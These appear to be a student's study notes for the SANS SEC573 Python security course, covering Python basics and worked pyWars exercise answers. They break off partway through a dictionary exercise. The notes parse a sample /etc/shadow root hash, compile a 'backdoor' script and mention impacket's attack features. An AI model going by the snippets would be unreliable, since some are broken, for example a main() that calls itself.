# 🗃 SANS | SEC573 - Automating Information Security with Python

Tags: 
Related to: [[SANS]], [[nuitka]], [[pdb]], [[py2exe]], [[pycdc]], [[python]], [[uncompyle6]], [[werejugo]]
See also: 
Previous:

## SEC573.1: Essentials Workshop with pyWars

**Section 1 Roadmap:**
- Lab Setup
- Python and pyWars
- Language Basics
- Strings
- Functions
- if/elif/else
- Modules
- Introspection

```python
# Return command-line arguments
import sys
// print("You passed the argument " + sys.argv[1])

# Return memory address
id()

# Return keyword list
import keyword
print(keyword.kwlist)

# See what Python thinks some data is
type()

# Show all methods and attributes associated with an object
dir()

# Create a byte string
b"\x41\x42\x43"
bytes([0x41,0x42,0x43])

# Convert bytes to string
>>> b'\xf0\x9f\x90\x8d \x41\x42\x43'.decode()

# Convert string to bytes
>>> "🐍🐍 \x80 \x41".encode()

# Convert int to char
chr(65)

# Convert chr to int
ord('A')

# Useful string methods
x.upper()				// uppercase
x.lower()				// lowercash
x.title()				// title case
x.replace('cks','x')	// replace substring
"War"   in x			// is substring in x?
"Peace" in x			// is substring in x?
x.split()				// convert to list
x.count('r')			// count substring

# Locate a string inside another and return character number at which the string starts
a.find("machine")

# Get length of iterable / find middle
len("string")
len("string") // 2		// find middle of a string with floor

# Encoders / Decoders
import codecs

# bytearrays() are MUTABLE , str() and byte() are not
x = bytearray(b"This is a bytearray")
x[0:4] = b"That"
x
b'That is a bytearray'

# See variables in namespace
globals()
locals()

# Create a mapping table to replace and remove characters from strings
text   = "Pyth0n -R0ck5!"
ttable = text.maketrans("05", "os", "-")
text.translate(ttable)
'Python Rocks!'

# Split string into tuple containing three elements
txt = "i could eat bananas all day"
txt.partition("bananas")
('I could eat ', 'bananas', ' all day')

# Split string into tuple containing three elements, using the last occurence of the specified string
txt = "I could eat bananas all day, bananas are my favorite fruit"
txt.rpartition("bananas")
('I could eat bananas all day, ', 'bananas', ' are my favorite fruit')
```

Unless otherwise noted, most things will work in Python2 if you add these lines to the top of your code:

```python
#!/usr/bin/env python2
from __future__ import print_function
from __future__ import division
import sys

if sys.version_info.major == 2:
	input = raw_input
```

More reliable way to launch python3:

	/usr/bin/env python3

Manually byte-compile a .py into a .pyc

```python
>>> import py_compile
>>> py_compile.compile("backdoor-final.py")
'__pycache__/backdoor-final.cpython-36.pyc'
```

Create package/executable from .py: [^1][^2]

Proper script structure:

```python
#!/usr/bin/env python3 -tt
#-*- coding: UTF-8 -*-
#You can comment a single line with a pound sign

""" The first string in the program is the DocString and """
""" is used by help function to describe the program."""

import sys
def main():
	"""A 'Docstring' for the main function here"""
	print("You passed the argument " + sys.argv[1])

	if __name__ == "__main__":
		main()
```

	-tt	// stop with error if mixed tabs with spaces

Python keywords:

```python
>>> import keyword
>>> print(keyword.kwlist)
['False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']
```

	The id(function) returns the memory address that a given variable points to.

See what Python thinks some data is:

	type()

Math operators:

Consider when x = 5

| Operation     |  Example   |Result in x | Shortcut|
|--------------------|------------|----------- |---------- |
| Addition             | x = x + 5  | 10         | a += 1|
| Subtraction          | x = x - 10 | -5         | a -= 1|
| Multiplication       | x = x * 5  | 25         | a *= 2*|
| Division             | x = x / 2  | 2.5        | a /= 10|
| Floor (drop decimal) | x = x // 2 | 2          | a //= 2|
| Modulo (remainder)   | x = x % 2  | 1          | a %= 5|
| Exponent             | x = x ** 2 | 25         |

```text
&	bitwise AND			format(  0b10101010 &  
                                 0b00001111       , "08b" )
								 -------------
								   00001010
								 
								 
|	bitwise OR			format(  0b10000001 |  
                                 0b00111100       , "08b" )
								 -------------
								   10111101
								 

^	bitwise XOR			format(  0b10101010 ^  
                                 0b00001111       , "08b" )
								 -------------
								   10100101
								 

<<	shift bits left		format(  0b00001111 << 
                                 2                , "08b" )
								 -------------
								   00111100
								 

>>	shift bits right	format(  0b11110000 >> 
                                 3                , "08b" )
								 -------------
								   00011110
								 

~	bitwise complement	format( ~0b11110000       , "08b" )
                                --------------
								  -11110001



```

Format Specifier:

```text
Syntax: {<#>:<F><A><L><T>}
Example: {0:X^20s}

# = Argument Number
F = Fill Character
A = Align
L = Len
T = Type

X: hex
X: uppercase hex
b: binary
d: decimal
f: float
s: string
%: percent sign
e: exponential notation
o: octal
c: integers to char
```

```python
>>> "Center 20 Wide [{0: ^20}]".format("Centered")
'Center 20 Wide [      Centered      ]'

>>> "Left 20 Wide X Fileed [{0:X<20}]".format("Left")
'Left 20 Wide X Fileed [LeftXXXXXXXXXXXXXXXX]'

>>> "Floats With Precision {0:0>6.2f}".format(3.14)
'Floats With Precision 003.14'

>>> "Floats With Precision {0: >10.6f}".format(3.14)
'Floats With Precision   3.140000'

>>> "Sign Numbers {0:+10.6f}".format(3.14)
'Sign Numbers  +3.140000'

>>> "Formatted HEX {0:0>10x}".format(255)
'Formatted HEX 00000000ff'

>>> "Formatted Binary {0:0>8b}".format(85)
'Formatted Binary 01010101'
```

Python 3.6 Format Strings:

```python
>>> course = "SEC573"
>>> rating = "Awesome Sauce!"

>>> f"{course} is {rating}"
'SEC573 is Awesome Sauce!'

>>> f"{course} is {rating:*^20}"
'SEC573 is ***Awesome Sauce!***'
```

Raw strings don't give special meaning to the bashslash.

	print(r"<backslashes here won't escape anything.>")

Convert between bytes() and str():

```python
# Use b"" or bytes([]) to create a byte string
>>> b"\x41\x42\x43"
b'ABC'
>>> bytes([0x41,0x42,0x43])
b'ABC'

# bytes() has a .decode() method that converts to a str() in Python3
>>> b'\xf0\x9f\x90\x8d \x41\x42\x43'.decode()
'🐍 ABC'

# str() has an .encode() method that converts to bytes() in Python3
>>> "🐍🐍 \x80 \x41".encode()
b'\xf0\x9f\x90\x8d\xf0\x9f\x90\x8d \xc2\x80 A'
>>> "🐍 🐍 \x80 \x41".encode()
b'\xf0\x9f\x90\x8d \xf0\x9f\x90\x8d \xc2\x80 A'
```

**To turn binary data into a string, you almost always want to encode with LATIN-1 because it has a one-for-one mapping of characters between 0 and 255.**

Encoding Characters in a String:

```python
>>> "\x41"													// encodes single byte character
'A'
>>> "\u0041"												// encodes 2-byte byte character
'A'
>>> "\U00000041"											// encodes 4-byte character
'A'
>>> print("\U0001f40d \U0001f40c \U0001f40b \U0001f40A")
```

Slicing Strings:

```text
- Strings can be sliced up into various substrings
- Syntax: [start:end:step]
- Start, end, and step are ALL optional
	- Number before first colon: Is always the start
	- Number after first colon: Is always the (up to but not including) end
	- Number after the second: Is always the step
	- If nothing is before first: Beginning is implied
	- If nothing is after first: The end of the string is implied
- Offset begins at ZERO!!!
- The "end" character is NOT included in the result
- Negative numbers start from the end of the string and work back
```

Consider x = "Python rocks"

 P | y | t | h | o | n |   | r | o | c | k | s
---|---|---|---|---|---|---|---|---|---|---|---
 00| 01| 02| 03| 04| 05| 06| 07| 08| 09| 10| 11
-12|-11|-10|-09|-08|-07|-06|-05|-04|-03|-02|-01

```text
x[0]							P
x[2]							t
x[0:3] or x[:3]					Pyt
x[0:-1] or x[:-1]				Python rock
x[3:]							hon rocks
x[::-1]							skcor nohtyP
x[-1] + x[4] + x[7] * 2 + x[1]	sorry
x[:6][::-1]						nohtyP
x[5::-1]						nohtyP
```

Variable resolution:

LEGB:
- Locally
- Enclosing
- Globally
- Builtin

A few favorite built-in Python modules:

```text
sys:			system functions like arguments and environment variables
subprocess:		start, stop, and interact with the OS and processes
urllib:			access websites anyone?
socket:			interface with the network
re:				regular expression parser
http.server:	a basic web server
pdb:			the Python debugger
hashlib:		SHA1, MD5, and other hash functions
```

A few third-party modules:

```text
beautiful soup:		parses HTML, XML, and other document types to extract useful information
requests:			easy-to-use interaction with websites
pexpect:			launches commands and interacts with them
impacket:			suite of offensive capabilities including Windows Authentication modiles, psexec, pass the hash, smb relay attacks, and more
plaso:				forensics Log2Timeline module with extendable plugin modules
scapy:				python packet analysis and crafting
gmail:				interact with gmail
pil:				python image library used to parse images
```

## SEC573.2: Essentials Workshop with MORE pyWars

**Section 2 Roadmap:**
- Lists
- Loops: For and While
- Tuples
- Dictionaries
- PDB: The Python Debugger
- Tips, Shortcuts, and Gotchas
- Transitioning Python2 to Python3

```python
# Useful methods
list[index] = value		// change an existing value
append(value)			// add an object to the end of the list
insert(position,value)	// insert the value at the given position in the list. Position is a positive or negative number
remove(value)			// remove the first matching item by its value
sort(key,direction)		// sort the elements of the list
count(value)			// count occurences of an item in the list
index(value)			// look up where a value is in the list
del list[index]			// delete an item by its index

# Functions that work on lists
sum([])					// adds all the integers in a list
zip([],[])				// groups together items at position 0 from each input list followed by the items at position 1, and so on
list(zip([],[]))		// return as list

# Sorting lists
list.sort()				// sorts the list in place, modifying it
sorted()				// creates a sorted copy of the list
						# passing (reverse=True) to either function sorts in reverse order
						# both methods can optionally accept a "key" function, which produces an element to sort on

```

for and while loop control structure:

```python
for x in list (or other iterable variable):
for x in range(100):
for x in range(start,stop,step):
for index,value in enumerate(list):
while x:

for x in list				// contains each element in the list
for x in range(len(list))	// contains each of the indexes in the list
list(enumerate(movies))		// if you need both, use enumerate()
[(0, 'Life of Brian'), (1, 'Holy Grail'), (2, 'Meaning of Life')]

for index,value in enumerate(movies):
	print("{} is in position {}".format(value,index))

(0, 'Life of Brian') is in position 0
(1, 'Holy Grail') is in position 1
(2, 'Meaning of Life') is in position 2

# An xor function using enumerate()
def xor_strings(str1,str2):
	result = ''
	for index,a_char in enumerate(str2):
		result += chr( ord(str1[index]) ^ ord(a_char) )
	return result

xor_strings("11", "10")
'\x00\x01'
```

See how much memory is being used:

```python
sys.getsizeof(tuple(range(10000)))	//tuples save you memory compared to lists
sys.getsizeof(list(range(10000)))
```

## SEC573.3: Defensive Python

**Section 3 Roadmap:**
- File Input/Output
- Regular Expressions
- Log Analysis Techniques
- Packet Analysis
- Using Scapy
- Packet Reassembly

## SEC573.4: Forensics Python

**Section 4 Roadmap:**
- Forensic File Carving
- Processing Data with Struct
- Python's Image Library
- Database Operations
	- Structured Query Language
	- Windows Registry Forensics
- HTTP Network Communications
	- Built-in Web Request with urllib
	- Using the Requests Module

## SEC573.5: Offensive Python

**Section 5 Roadmap:**
- Network Communications
- Exception Handling
- Process Execution
- Distributing Python as .EXE
- Socket Large Data Transfers
- Python Objects and Object Programming

## Workbook

### Exercise 0: Workstation Setup

- [x] 

- To configure your laptop networking to get an IP Address from the classroom DHCP server
- To open the class Virtual Machine in VMware
- To install Python and the required modules on a Windows host before Section 5
- (If required) Configure VMware Bridged Networking in wired network only classrooms
- (If required) Establish connection to OnDemand and Simulcast
- Understand how to do pyWars outside of the classroom
- Understand how to access the pyWars Hall of Fame questions

Install PyInstaller?

	/Windows_Setup/PyInstaller-3.2.1.tar.bz2: Osx.Malware.Agent-6028016-0 FOUND	// oh hello there

	python3

```python
import local_pyWars as pyWars
game = pyWars.exercise()
```

	./local_pyWars.py

### Exercise 1.1: Let's Play pyWars! 

- [x] 

**Objectives:**
- About half of our in‐class labs are pyWars challenges
- pyWars is a good practice for GPYC when you go home
- In short, everyone will do some pyWars
- You will take home a local_pyWars server, which is included in your virtual machine
- Let's do pyWars Questions 0 and 4 together!

```python
>>> game.question(0)
'Simply submit the string returned when you call .data(0) as the answer. '
>>> game.data(0)
'SUBMIT-ME'

>>> game.answer(0, game.data(0))
'Correct'
```

```python
>>> game.question(1)
'Submit the sum of .data()+ 5. '
>>> game.data(1)
13

>>> game.answer(1, game.data(1) + 5)
'Correct'
```

```python
>>> game.question(2)
'Using exponent math, submit 16 to the nth power where n is the number in .data(). '
>>> game.data(2)
92

>>> game.answer(2, 16 ** game.data(2))
'Correct'
```

```python
>>> game.question(3)
'.data() will contain a string.  Turn it into a float and submit it. '
>>> game.data(3)
'3.3925513220431505'

>>> game.answer(3, float(game.data(3)))
'Correct'
```

```python
>>> game.question(4)
'The four most significant bits of the first byte of an IP header contains the IP version. The data contains a single byte expressed as an integer between 0 and 255. Use bit shifting to submit the integer in the first 4 bits of .data(). '
>>> game.data(4)
71

>>> game.answer(4, game.data(4) >> 4)
'Correct'
```

### Exercise 1.2: pyWars Strings 

- [x] 

**Objectives:**
- pyWars challenges 5–13 asks you to slice and encode strings
- Complete as many of them as you can
- If you finish all of them, keep going!

```python
>>> game.question(5)
'Data will give you Python bytes. Submit a Python string.'
>>> game.data(5)
b'run away! run away!'

>>> game.answer(5, game.data(5).decode())
'Correct'
```

```python
>>> game.question(6)
'Data will give you a Python string. Submit bytes.'
>>> game.data(6)
'this parrot is dead'

>>> game.answer(6, game.data(6).encode())
'Correct'
```

```python
>>> game.question(7)
'What is the ordinal value of the 5th character in the .data()?'
>>> game.data(7)
'🐬 🗝 🕬 💒 🔐 🖯 💑 📕 💊 🔻 💂 🕋 📳 🖂 🕤 🖨 💐 🐠 🔨 🖥 '

>>> game.answer(7, ord(game.data(7)[4]))
'Correct'
```

```python
>>> game.question(8)
'How many bytes are required to store the character from .data()?'
>>> game.data(8)
'🌎'

>>> game.data(8).encode()
b'\xf0\x9f\x8c\x8e'

>>> game.answer(8, len(game.data(8).encode()))
'Correct'
```

```python
>>> game.question(9)
'ROT-13 encode the .data() string. For example ABCDEFG becomes NOPQRST '
>>> x = game.data(9)
>>> x
'jrypbzr-gb-fnaf'

>>> import codecs
>>> codecs.encode(x, "ROT13")
'welcome-to-sans'

>>> game.answer(9, codecs.encode(game.data(9), "ROT13"))
'Correct'
```

```python
>>> game.question(10)
'Decode the BASE64 encoded .data() string. '
>>> game.data(10)
b'aGVsbG8gd29ybGQ='

>>> codecs.decode(game.data(10), "BASE64")
b'hello world'

>>> game.answer(10, codecs.decode(game.data(10), "BASE64"))
'Correct'
```

```python
>>> game.question(11)
'Make .data() all CAPS.   For example Test->TEST '
>>> game.data(11)
'are you having fun'

>>> game.data(11).upper()
'ARE YOU HAVING FUN'

>>> game.answer(11, game.data(11).upper())
'Correct'
```

```python
>>> game.question(12)
"The answer is the position of the first letter of the word 'SANS' in the data() string. "
>>> game.data(12)
'STI is SANS Technology Institute'

>>> game.answer(12, game.data(12).find("SANS"))
'Correct'
```

```python
>>> game.question(13)
'Read the .data() string and write it backwards. '
>>> game.data(13)
'its just a flesh wound'

>>> game.data(13)[::-1]								// slice syntax
'dnuow hself a tsuj sti'

>>> game.answer(13, game.data(13)[::-1])
'Correct'
```

**Conclusions:**
- Dealt with bytes and strings
- Converted characters to ordinal values
- Encoded a string using ROT‐13
- Decoded a string that was encoded with base64
- Converted a string to all uppercase
- Found the position of a string in a bigger string
- Reversed a string

### Exercise 1.3: pyWars Functions 

- [x] 

**Objectives:**
- Write a function when solving each of the following pyWars questions
- Complete as many of the following as you can: 14, 15, 16, 17, and 18
- If you finish all five of them, keep going!

```python
>>> d.question(14)
'Submit data() forward+backwards+forward. For example SAM -> SAMMASSAM '
>>> d.data(14)
'killall -9 perl'

>>> d.data(14) + d.data(14)[::-1] + d.data(14)
'killall -9 perllrep 9- llallikkillall -9 perl'

>>> def doanswer14(input_data):
...     return input_data + input_data[::-1] + input_data
... 

>>> d.answer(14, doanswer14(d.data(14)))
'Correct'
```

```python
>>> d.question(15)
'Return the 2nd, 5th and 9th character.  For example 0123456789->148 '
>>> d.data(15)
'wxsbvf8fdoaw'

>>> x = d.data(15)
>>> x[1] + x[4] + x[8]
'xvd'

>>> def doanswer15(input_data):
...     return input_data[1] + input_data[4] + input_data[8]
...

>>> d.answer(15, doanswer15(d.data(15)))
'Correct'
```

```python
>>> d.question(16)
'Swap the first and last character. For example frog->grof, Hello World->dello Worlh etc. '
>>> d.data(16)
'We want... a shrubbery!'

>>> d.data(16)[-1] + d.data(16)[1:-1] + d.data(16)[0]
'!e want... a shrubberyW'

>>> def doanswer16(input_data):
...     return input_data[-1] + input_data[1:-1] + input_data[0]
...

>>> d.answer(16, doanswer16(d.data(16)))
'Correct'
```

```python
>>> d.question(17)
'Reverse the first half of the data(). For example sandwich->dnaswich '
>>> d.data(17)
'dfcjajlza5'

>>> x = d.data(17)
>>> x[:len(x) // 2]
'dfcja'

>>> def doanswer17(x):
...     return x[:len(x) // 2][::-1] + x[len(x) // 2:]
... 

>>> d.answer(17, doanswer17(d.data(17)))
'Correct'
```

```python
>>> d.question(18)
'Leet speak it (E->3,A->4,T->7,S->5,G->6) convert only uppercase letters. For example LeEtSpEAk->Le3t5p34k '
>>> x = d.data(18)
>>> x
'EEpPApSkEGAppYLPA'

# METHOD 1--------------------------------------------
>>> def doanswer18(x):
...     return x.replace("E","3").replace("A","4").replace("T","7").replace("S","5").replace("G","6")
...

>>> d.answer(18, doanswer18(d.data(18)))
'Correct'

# METHOD 2--------------------------------------------
>>> def do18(data):
...     ttable = data.maketrans("EATSG", "34756")
...     return   data.translate(ttable)

>>> d.answer(18, do18(d.data(18)))
'Correct'
```

### Exercise 1.4: Modules 

- [x] 

**Objectives:**
- Create a module that contains functions that solve pyWars problems
- Execute the module as a program
- Import that function into your Python shell using "import pywars_answers"
- Try it again using "from pywars_answers import answer1"
- reload() the module after making changes

		vi pywars_answers.py

```python
import pyWars					// comment this
#import local_pyWars as pyWars	// uncomment this

def answer1(datasample):
    return datasample+5

def main():
    print("#1", d.answer( 1, answer1(d.data(1))))


if __name__ == "__main__":
    d = pyWars.exercise()
    d.login("YourUsername","YourPassword")
    main()
    d.logout()
```

	python pywars_answers.py 	// #1 Correct

	python3

```python
>>> import pywars_answers
>>> pywars_answers.answer1(20)
25
```

	python3

```python
>>> from pywars_answers import *
>>> d = pyWars.exercise()
>>> d.answer(1, answer1(d.data(1)))
'Correct'
```

	vi pywars_answers.py	// open in a new tab; add the following import and function

```python
import codecs

def answer2(datasample):
    return 16 ** datasample
```

From the same python3 session above:

```python
>>> answer2(1)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'answer2' is not defined
```

We must reload the module:

```python
>>> import importlib
>>> import pywars_answers
>>> importlib.reload(pywars_answers)
<module 'pywars_answers' from '/home/student/Documents/pythonclass/essentials-workshop/pywars_answers.py'>
>>> pywars_answers.answer2(1)
16

>>> from pywars_answers import *
>>> answer2(d.data(2))
601226901190101306339707032778070279008174732520529886901066488712245510429339761526706943586500787976175353856
```

**Conclusions:**
- In this lab, we learned how to create a module
- We learned how modules use the `__name__` variable to determine if it is imported
- We learned how to import modules two different ways and how they affect namespaces
- We learned how to reload a module after changes have been made on disk

### Exercise 2.1: pyWars Lists

- [x] 

**Objectives:**
- Perform the list exercises in pyWars
- May require many of the skills from Day 1 beyond just lists
- Most require you to define a function
- You need loops for some of these
- Complete as many of the following as you can: 19 through 30

		./local_pyWars.py

```python
>>> d.question(19)
'Read the list from data and return the 3rd element '
>>> d.data(19)
[47, 60, 59, 39, 69]

>>> d.answer(19, d.data(19)[2])
'Correct'
```

```python
>>> d.question(20)
'Build a list of numbers starting at 1 and up to but not including the number in data(). '
>>> d.data(20)
61

>>> list(range(1, d.data(20)))
[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60]

>>> d.answer(20, list(range(1, d.data(20))))
'Correct'
```

```python
>>> d.question(21)
'Count the number of items in the list in data().  The answer is the number of items in the list.'
>>> d.data(21)
['q', '9', '8', 'w', '2', 'q', 'n', 'o']

>>> len(d.data(21))
8

>>> d.answer(21, len(d.data(21)))
'Correct'
```

```python
>>> d.question(22)
'Split the data element based on the comma (",") delimiter and return the 10th element '
>>> d.data(22)
'm,8,9,z,g,h,7,z,7,3,c,k,j,o,p,v,g,i'

>>> d.data(22).split(",")[9]
'3'

>>> def doanswer22(x):
...     return x.split(",")[9]
... 

>>> d.answer(22, doanswer22(d.data(22)))
'Correct'
```

```python
>>> d.question(23)
'The data element contains a line from an /etc/shadow file. The shadow file is a colon delimited file.  The 2nd field in the colon delimited field contains the password information.   The password information is a dollar sign delimited field with three parts.  The first part indicates what cypher is used.  The second part is the password salt.  The last part is the password hash.   Retrieve the password salt for the root user.'
>>> d.data(23)
'root:$1$udhum8Uk$370xDLmeGD9m4aF/ciIlC.:14425:0:99999:7:::'

>>> d.data(23).split(":")[1]
'$1$udhum8Uk$370xDLmeGD9m4aF/ciIlC.'
>>> d.data(23).split(":")[1].split("$")[1]
'1'
>>> d.data(23).split(":")[1].split("$")[2]
'udhum8Uk'

>>> def doanswer23(x):
...     return x.split(":")[1].split("$")[2]
... 

>>> d.answer(23, doanswer23(d.data(23)))
'Correct'
```

```python
>>> d.question(24)
'Add the string "Pywars rocks" to the end of the list in the data element.  Submit the new list. '
>>> x = d.data(24)
>>> x
['an African or European Swallow?', 'thats no ordinary rabbit']

>>> x.append('Pywars rocks')
>>> x
['an African or European Swallow?', 'thats no ordinary rabbit', 'Pywars rocks']

>>> def doanswer24(x):
...     x.append('Pywars rocks')
...     return x

>>> d.answer(24, doanswer24(d.data(24)))
'Correct'
```

```python
>>> d.question(25)
'Add up all the numbers in the list and submit the total. '
>>> x = d.data(25)
>>> x
[6, 3, 6, 6, 8, 6, 8, 3, 9, 9, 2, 4, 0, 9, 8, 7, 1, 8, 7, 6, 8, 8, 4, 5, 6, 5, 4, 9]

>>> sum(x)
165

# METHOD 1--------------------------------------------
>>> d.answer(25, sum(d.data(25)))
'Correct'

# METHOD 2--------------------------------------------
>>> def mysum(x):
...     total = 0
...     for i in x:
...             total = total + i
...     return total

>>> d.answer(25, mysum(d.data(25)))
'Correct'
```

```python
>>> d.question(26)
'Given a string that contains numbers separated by spaces, add up the numbers and submit the sum.  "1 1 1" -> 3 '
>>> x = d.data(26)
>>> x
'65 121 178 108 145 12 15'

>>> x.split()
['65', '121', '178', '108', '145', '12', '15']

>>> sum(map(int, x.split()))
644

# METHOD 1--------------------------------------------
>>> d.answer(26, sum(map(int, d.data(26).split())))
'Correct'

# METHOD 2--------------------------------------------
>>> def mysum(x):
...     total = 0
...     for num in x.split():
...             total = total + int(num)
...     return total

>>> d.answer(26, mysum(d.data(26)))
'Correct'
```

```python
>>> d.question(27)
'Create a string by joining together the words "this","python","stuff","really","is","fun" by the character in .data().   For example if data contains a hyphen (ie "-") then you submit "this-python-stuff-really-is-fun".  '
d.data(27)
'-'

>>> d.data(27).join(["this", "python", "stuff", "really", "is", "fun"])
'this-python-stuff-really-is-fun'

>>> d.answer(27, d.data(27).join(["this", "python", "stuff", "really", "is", "fun"]))
'Correct'
```

```python
>>> d.question(28)
'The answer is the list of numbers between 1 and 1000 that are evenly divisible by the number provided.  2->[2,4,6,8..] 4->[4,8,16..] '
>>> d.data(28)
12

>>> list(range(0, 1001, d.data(28)))[1:]
[12, 24, 36, 48, 60, 72, 84, 96, 108, 120, 132, 144, 156, 168, 180, 192, 204, 216, 228, 240, 252, 264, 276, 288, 300, 312, 324, 336, 348, 360, 372, 384, 396, 408, 420, 432, 444, 456, 468, 480, 492, 504, 516, 528, 540, 552, 564, 576, 588, 600, 612, 624, 636, 648, 660, 672, 684, 696, 708, 720, 732, 744, 756, 768, 780, 792, 804, 816, 828, 840, 852, 864, 876, 888, 900, 912, 924, 936, 948, 960, 972, 984, 996]

# METHOD 1--------------------------------------------
>>> d.answer(28, list(range(0, 1001, d.data(28)))[1:])
'Correct'

# METHOD 2--------------------------------------------
>>> def doanswer28(x):
...     answerlist = []
...     for eachnum in range(1, 1001):
...             if eachnum % x == 0:
...                     answerlist.append(eachnum)
...     return answerlist

>>> d.answer(28, doanswer28(d.data(28)))
'Correct'
```

```python
>>> d.question(29)
'Given a list of hexadecimal digits return a string that is made from their ASCII characters.  Ex [41 4f] -> "AO" '
>>> x = d.data(29)
>>> x
['74', '68', '61', '74', '73', '20', '6e', '6f', '20', '6f', '72', '64', '69', '6e', '61', '72', '79', '20', '72', '61', '62', '62', '69', '74']

>>> chr(int(x[0], 16))
't'
>>> chr(int(x[1], 16))
'h'

>>> def doanswer29(xlist):
...     answerstring = ""
...     for hexchar in xlist:
...             answerstring = answerstring + chr(int(hexchar, 16))
...     return answerstring

>>> doanswer29(x)
'thats no ordinary rabbit'

>>> d.answer(29, doanswer29(d.data(29)))
'Correct'
```

```python
>>> d.question(30)
'You will be given a list that contains two lists.  Combine the two lists and eliminate duplicates.  The answer is the SORTED combined list.  [[d,b,a,c][b,d]] -> [a,b,c,d] '
>>> x = d.data(30)
>>> x
[['5', '5', '4', '9'], ['2', '7', '5', '6', '9']]

# METHOD 1--------------------------------------------
>>> def doanswer30(two_lists):
...     return sorted(set(two_lists[0] + two_lists[1]))

>>> doanswer30(x)
['2', '4', '5', '6', '7', '9']

>>> d.answer(30, doanswer30(d.data(30)))
'Correct'

# METHOD 2--------------------------------------------
>>> def doanswer30(two_lists):
...     uniquelist = []
...     for item in two_lists[0] + two_lists[1]:
...             if not item in uniquelist:
...                     uniquelist.append(item)
...     return sorted(uniquelist)

>>> doanswer30(x)
['2', '4', '5', '6', '7', '9']

>>> d.answer(30, doanswer30(d.data(30)))
'Correct'
```

**Conclusions:**
In this lab, we covered how to work with lists by doing the following:

- Grab an element out of a list at a specific index
- Create a list of numbers up to a specified number or divisible by a certain number
- Count the number of items in a list
- Split a string to create a list
- Split a string to extract data
- Append an item to a list
- Sum all items in a list
- Create a string by joining a list of strings together
- Combine two lists, sort them, and remove duplicates

### Exercise 2.2: pyWars Dictionaries

- [x] 

**Objectives:**
- Perform the list exercises in pyWars
- Work with Python dictionaries
- Most require you to define a function
- Complete as many of the following as you can: 31 through 35

```python
>>> d.question(31)
'Data contains a dictionary.  Submit a SORTED list of all of the keys in the dictionary. '
>>> x = d.data(31)
>>> x
{'1': 'l', 'y': 'k', 'a': 'f', 'd': 'k', '9': 'd', '4': '9', 'i': '8', 'm': 'c', 'b': 'l', '7': 'd', 'w': 'a', 'r': '9', '2': 'r', 'z': '2', 'n': 'x'}

>>> sorted(d.data(31).keys())
['1', '2', '4', '7', '9', 'a', 'b', 'd', 'i', 'm', 'n', 'r', 'w', 'y', 'z']

>>> d.answer(31, sorted(d.data(31).keys()))
'Correct'
```

```python
>>> d.question(32)
'Data contains a dictionary.  Submit a SORTED list of all of the values in the dictionary.'
>>> x = d.data(32)
>>> x
{'a': 'z', 'v': 'o', '5': 'q', 'k': '8', 'h': '3', '1': 'v', 'b': 'y', 'y': 'u', '2': 'e', 'g': 'k', '3': 'z', 'e': '1', 'o': 't'}

>>> sorted(d.data(32).values())
['1', '3', '8', 'e', 'k', 'o', 'q', 't', 'u', 'v', 'y', 'z', 'z']

>>> d.answer(32, sorted(d.data(32).values()))
'Correct'
```

```python
>>> d.question(33)
'Data contains a dictionary.  Submit a SORTED list of tuples.  There should be one tuple for each entry in the dictionary. Each tuple should contain a key and its associated value from the dictionary.'
>>> x = d.data(33)
>>> x
{'5': 'p', '6': 'r', 'n': 'h', 'i': '4', 'u': 'm', 'd': 'z', 'g': 'n', 'z': 'n', 'c': 'l', 'a': '8'}

>>> sorted(x.items())
[('5', 'p'), ('6', 'r'), ('a', '8'), ('c', 'l'), ('d', 'z'), ('g', 'n'), ('i', '4'), ('n', 'h'), ('u', 'm'), ('z', 'n')]

>>> d.answer(33, sorted(d.data(33).items()))
'Correct'
```

```python
>>> d.question(34)
'Data contains a dictionary.  Add together the integers stored in the dictionary entries with the keys "python" and "rocks" and submit their sum. '
>>> x = d.data(34)
>>> x
{'python': 537, 'rocks': 655, 'big': 40}

>>> x.get('python') + x.get('rocks')
1192

>>> def doanswer34(x):
...     return x.get('python') + x.get('rocks')

>>> doanswer34(x)
1192

>>> d.answer(34, doanswer34(d.data(34)))
'Correct'
```

```python
>>> d.question(35)
"Data contains a dictionary of dictionaries.  The outer dictionary contains dates in the format of Month-Year.  The value for each of those entries is another dictionary.  That dictionary contains Operating System classes as the key and its percentage of use in the target organization as the value.  What percentage of the attack surface was 'Vista' in '6-2017'?"
>>> x = d.data(35)
>>> x
{'1-2017': {'Win7': '0.4', 'Vista': '0.21', 'NT*': '0.02', 'WinXP': '0.06', 'Linux': '0.15', 'Mac': '0.03', 'Mobile': '0.29'}, '2-2017': {'Win7': '0.49', 'Vista': '0.23', 'NT*': '0.06', 'WinXP': '0.06', 'Linux': '0.17', 'Mac': '0.05', 'Mobile': '0.29'}, '3-2017': {'Win7': '0.43', 'Vista': '0.22', 'NT*': '0.08', 'WinXP': '0.08', 'Linux': '0.11', 'Mac': '0.03', 'Mobile': '0.21'}, '4-2017': {'Win7': '0.43', 'Vista': '0.27', 'NT*': '0.05', 'WinXP': '0.08', 'Linux': '0.15', 'Mac': '0.09', 'Mobile': '0.21'}, '5-2017': {'Win7': '0.48', 'Vista': '0.29', 'NT*': '0.07', 'WinXP': '0.08', 'Linux': '0.14', 'Mac': '0.09', 'Mobile': '0.25'}, '6-2017': {'Win7': '0.4', 'Vista': '0.25', 'NT*': '0.05', 'WinXP': '0.09', 'Linux': '0.14', 'Mac': '0.05', 'Mobile': '0.24'}, '7-2017': {'Win7': '0.41', 'Vista': '0.27', 'NT*': '0.07', 'WinXP': '0.08', 'Linux': '0.17', 'Mac': '0.05', 'Mobile': '0.29'}, '8-2017': {'Win7': '0.42', 'Vista': '0.22', 'NT*': '0.08', 'WinXP': '0.06', 'Linux': '0.16', 'Mac': '0.07', 'Mobile': '0.29'}, '9-2017': {'Win7': '0.45', 'Vista': '0.23', 'NT*': '0.05', 'WinXP': '0.07', 'Linux': '0.15', 'Mac': '0.03', 'Mobile': '0.29'}, '10-2017': {'Win7': '0.44', 'Vista': '0.29', 'NT*': 